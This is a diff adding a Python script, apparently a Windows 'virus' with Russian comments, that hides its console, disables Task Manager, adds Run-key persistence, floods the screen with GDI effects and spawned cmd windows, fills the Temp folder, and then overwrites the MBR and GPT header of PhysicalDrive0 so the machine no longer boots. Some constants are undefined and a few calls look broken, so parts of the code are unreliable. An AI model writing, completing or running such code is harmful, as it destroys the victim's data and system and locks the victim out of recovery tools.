@@ -1,0 +1,363 @@
+# virus_maksdv.py
+# Вирус с GDI эффектами и разрушением MBR/GPT
+
+import os
+import sys
+import random
+import time
+import threading
+import subprocess
+from ctypes import *
+from ctypes.wintypes import *
+import struct
+
+# Константы Windows API
+GENERIC_READ = 0x80000000
+GENERIC_WRITE = 0x40000000
+OPEN_EXISTING = 3
+FILE_SHARE_READ = 0x00000001
+FILE_SHARE_WRITE = 0x00000002
+
+# Импорт Windows API функций
+kernel32 = windll.kernel32
+gdi32 = windll.gdi32
+user32 = windll.user32
+
+class MaksDVBomb:
+    def __init__(self):
+        self.running = True
+        self.effects = [
+            self.matrix_effect,
+            self.rainbow_wave,
+            self.pixel_chaos,
+            self.spiral_madness,
+            self.text_bombardment
+        ]
+        
+    def admin_check(self):
+        """Проверка прав администратора"""
+        try:
+            return kernel32.GetCurrentProcess() != 0
+        except:
+            return False
+    
+    def create_cmd_windows(self):
+        """Создание множества командных окон с сообщением"""
+        for i in range(20):
+            try:
+                cmd = f'cmd.exe /k echo бомба от maksdv активирована && title MAKSDV BOMB {i} && color 0C && echo SYSTEM COMPROMISED && echo MBR/GPT DESTROYED && ping -n 10 127.0.0.1'
+                subprocess.Popen(cmd, shell=True)
+                time.sleep(0.5)
+            except:
+                pass
+    
+    def destroy_mbr_gpt(self):
+        """Разрушение MBR и GPT"""
+        try:
+            # Открываем физический диск для записи
+            drive_handle = kernel32.CreateFileW(
+                "\\\\.\\PhysicalDrive0",
+                GENERIC_READ | GENERIC_WRITE,
+                FILE_SHARE_READ | FILE_SHARE_WRITE,
+                None,
+                OPEN_EXISTING,
+                0,
+                None
+            )
+            
+            if drive_handle != -1:
+                # Создаем поврежденный MBR
+                corrupted_mbr = bytearray(512)
+                
+                # Заполняем случайными данными
+                for i in range(512):
+                    corrupted_mbr[i] = random.randint(0, 255)
+                
+                # Добавляем сообщение
+                message = "MAKSDV BOMB - MBR DESTROYED"
+                corrupted_mbr[0:len(message)] = message.encode('utf-8')
+                
+                # Убираем сигнатуру 55 AA
+                corrupted_mbr[510] = 0x00
+                corrupted_mbr[511] = 0x00
+                
+                # Записываем поврежденный MBR
+                bytes_written = DWORD()
+                kernel32.WriteFile(
+                    drive_handle,
+                    byref(c_char_p(corrupted_mbr)),
+                    512,
+                    byref(bytes_written),
+                    None
+                )
+                
+                # Повреждаем GPT (если есть)
+                gpt_offset = 512  # LBA 1 для GPT header
+                kernel32.SetFilePointer(drive_handle, gpt_offset, None, FILE_BEGIN)
+                
+                corrupted_gpt = bytearray(512)
+                gpt_message = "MAKSDV GPT DESTROYED"
+                corrupted_gpt[0:len(gpt_message)] = gpt_message.encode('utf-8')
+                
+                kernel32.WriteFile(
+                    drive_handle,
+                    byref(c_char_p(corrupted_gpt)),
+                    512,
+                    byref(bytes_written),
+                    None
+                )
+                
+                kernel32.CloseHandle(drive_handle)
+                
+        except Exception as e:
+            pass
+    
+    def matrix_effect(self, hdc, width, height):
+        """Эффект матрицы"""
+        for i in range(1000):
+            x = random.randint(0, width - 1)
+            y = random.randint(0, height - 1)
+            char = random.choice(['0', '1', 'MAKSDV', 'BOMB'])
+            
+            # Зеленый текст на черном фоне
+            gdi32.SetTextColor(hdc, 0x0000FF00)
+            gdi32.SetBkColor(hdc, 0x00000000)
+            gdi32.TextOutW(hdc, x, y, char, len(char))
+            
+            if i % 100 == 0:
+                time.sleep(0.01)
+    
+    def rainbow_wave(self, hdc, width, height):
+        """Радужная волна"""
+        colors = [0x000000FF, 0x0000FF00, 0x00FF0000, 0x00FFFF00, 0x00FF00FF, 0x0000FFFF]
+        
+        for frame in range(50):
+            color = colors[frame % len(colors)]
+            brush = gdi32.CreateSolidBrush(color)
+            
+            # Рисуем случайные прямоугольники
+            for i in range(50):
+                left = random.randint(0, width)
+                top = random.randint(0, height)
+                right = left + random.randint(50, 200)
+                bottom = top + random.randint(50, 200)
+                
+                rect = RECT(left, top, right, bottom)
+                gdi32.FillRect(hdc, byref(rect), brush)
+            
+            gdi32.DeleteObject(brush)
+            time.sleep(0.1)
+    
+    def pixel_chaos(self, hdc, width, height):
+        """Пиксельный хаос"""
+        for i in range(50000):
+            x = random.randint(0, width - 1)
+            y = random.randint(0, height - 1)
+            color = RGB(
+                random.randint(0, 255),
+                random.randint(0, 255), 
+                random.randint(0, 255)
+            )
+            
+            gdi32.SetPixel(hdc, x, y, color)
+            
+            if i % 1000 == 0:
+                time.sleep(0.01)
+    
+    def spiral_madness(self, hdc, width, height):
+        """Спиральное безумие"""
+        center_x, center_y = width // 2, height // 2
+        
+        for angle in range(0, 3600, 5):
+            rad = angle * 3.14159 / 180
+            radius = angle / 10
+            
+            x = center_x + int(radius * math.cos(rad))
+            y = center_y + int(radius * math.sin(rad))
+            
+            color = RGB(
+                angle % 255,
+                (angle + 85) % 255,
+                (angle + 170) % 255
+            )
+            
+            pen = gdi32.CreatePen(0, 2, color)
+            old_pen = gdi32.SelectObject(hdc, pen)
+            
+            if angle == 0:
+                gdi32.MoveToEx(hdc, center_x, center_y, None)
+            gdi32.LineTo(hdc, x, y)
+            
+            gdi32.SelectObject(hdc, old_pen)
+            gdi32.DeleteObject(pen)
+    
+    def text_bombardment(self, hdc, width, height):
+        """Текстовая бомбардировка"""
+        messages = [
+            "MAKSDV BOMB", "SYSTEM DESTROYED", "MBR CORRUPTED",
+            "GPT ERASED", "WINDOWS KILLED", "GOODBYE SYSTEM",
+            "MAKSDV WAS HERE", "BOMB ACTIVATED", "FATAL ERROR",
+            "CRITICAL DAMAGE", "BOOT FAILURE", "OS TERMINATED"
+        ]
+        
+        for i in range(200):
+            message = random.choice(messages)
+            x = random.randint(0, width - 100)
+            y = random.randint(0, height - 20)
+            
+            # Случайный цвет
+            color = RGB(
+                random.randint(0, 255),
+                random.randint(0, 255),
+                random.randint(0, 255)
+            )
+            
+            gdi32.SetTextColor(hdc, color)
+            gdi32.SetBkMode(hdc, 1)  # Transparent
+            
+            # Случайный размер шрифта
+            font_size = random.randint(20, 72)
+            font = gdi32.CreateFontW(
+                font_size, 0, 0, 0, FW_BOLD, 0, 0, 0,
+                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
+                CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
+                DEFAULT_PITCH, "Arial"
+            )
+            
+            old_font = gdi32.SelectObject(hdc, font)
+            gdi32.TextOutW(hdc, x, y, message, len(message))
+            gdi32.SelectObject(hdc, old_font)
+            gdi32.DeleteObject(font)
+            
+            time.sleep(0.05)
+    
+    def gdi_effects_thread(self):
+        """Поток с GDI эффектами"""
+        try:
+            # Получаем контекст всего экрана
+            hdc = user32.GetDC(0)
+            width = user32.GetSystemMetrics(0)  # SM_CXSCREEN
+            height = user32.GetSystemMetrics(1) # SM_CYSCREEN
+            
+            # Запускаем различные эффекты
+            while self.running:
+                effect = random.choice(self.effects)
+                try:
+                    effect(hdc, width, height)
+                except:
+                    pass
+                
+                # Небольшая пауза между эффектами
+                time.sleep(1)
+            
+            user32.ReleaseDC(0, hdc)
+        except:
+            pass
+    
+    def system_chaos_thread(self):
+        """Поток с системным хаосом"""
+        time.sleep(10)  # Ждем 10 секунд перед началом хаоса
+        
+        # Создаем хаос в реестре
+        try:
+            reg_commands = [
+                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MAKSDV_BOMB" /t REG_SZ /d "{}" /f'.format(sys.argv[0]),
+                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" /v "PendingFileRenameOperations" /t REG_MULTI_SZ /d "{}|{}" /f'.format(sys.argv[0], sys.argv[0]),
+            ]
+            
+            for cmd in reg_commands:
+                subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        except:
+            pass
+        
+        # Создаем файловый хаос
+        try:
+            for i in range(100):
+                filename = f"C:\\Windows\\Temp\\maksdv_bomb_{i}.txt"
+                with open(filename, 'w', encoding='utf-8') as f:
+                    f.write("бомба от maksdv активирована\n" * 1000)
+        except:
+            pass
+    
+    def start_attack(self):
+        """Запуск полной атаки"""
+        print("бомба от maksdv активирована")
+        
+        # Запускаем GDI эффекты в отдельном потоке
+        gdi_thread = threading.Thread(target=self.gdi_effects_thread)
+        gdi_thread.daemon = True
+        gdi_thread.start()
+        
+        # Запускаем системный хаос
+        chaos_thread = threading.Thread(target=self.system_chaos_thread)
+        chaos_thread.daemon = True
+        chaos_thread.start()
+        
+        # Создаем командные окна
+        self.create_cmd_windows()
+        
+        # Ждем 30 секунд перед разрушением MBR/GPT
+        time.sleep(30)
+        
+        # Запускаем разрушение MBR/GPT
+        print("Уничтожение MBR/GPT...")
+        self.destroy_mbr_gpt()
+        
+        # Финальные эффекты
+        for i in range(10):
+            self.create_cmd_windows()
+            time.sleep(2)
+        
+        # Бесконечный цикл для поддержания активности
+        while True:
+            time.sleep(1)
+
+# Дополнительные функции для усиления воздействия
+def disable_task_manager():
+    """Отключение диспетчера задач"""
+    try:
+        subprocess.Popen(
+            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f',
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+    except:
+        pass
+
+def change_wallpaper():
+    """Изменение обоев рабочего стола"""
+    try:
+        # Создаем черные обои
+        subprocess.Popen(
+            'reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "" /f',
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        subprocess.Popen('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters', shell=True)
+    except:
+        pass
+
+def main():
+    """Основная функция"""
+    try:
+        # Скрываем окно консоли
+        kernel32.ShowWindow(kernel32.GetConsoleWindow(), 0)
+    except:
+        pass
+    
+    # Запускаем дополнительные функции хаоса
+    disable_task_manager()
+    change_wallpaper()
+    
+    # Создаем и запускаем бомбу
+    bomb = MaksDVBomb()
+    bomb.start_attack()
+
+if __name__ == "__main__":
+    # Добавляем импорт math для спирального эффекта
+    import math
+    
+    # Запускаем вирус
+    main()
